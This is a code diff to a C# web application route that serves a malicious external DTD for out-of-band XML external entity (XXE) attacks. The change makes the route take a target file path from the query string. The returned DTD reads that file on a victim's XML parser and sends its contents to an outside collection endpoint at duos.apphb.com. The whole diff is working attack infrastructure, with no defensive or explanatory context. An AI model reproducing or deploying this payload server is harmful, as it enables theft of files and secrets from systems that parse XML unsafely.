@@ -53,7 +53,7 @@ namespace DuosWeb
 
             Get["/tomtom/dtd"] = _ =>
             {
-                string path = _.path;
+                string path = Request.Query.path;
                 return Response.AsText("<!ENTITY % data SYSTEM \"" + path + "\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://duos.apphb.com/tomtom/add?q=%data;'>\">");
             };
         }
